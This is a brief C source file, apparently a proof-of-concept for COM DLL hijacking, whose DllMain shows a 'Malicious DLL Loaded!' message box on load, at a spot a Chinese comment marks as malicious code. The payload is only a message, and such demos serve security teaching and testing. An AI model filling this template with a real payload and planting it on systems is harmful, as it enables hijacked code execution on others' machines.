#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        // 恶意代码
        MessageBox(NULL, "Malicious DLL Loaded!", "COM DLL Hijacking", MB_OK);
        break;
    }
    return TRUE;
}
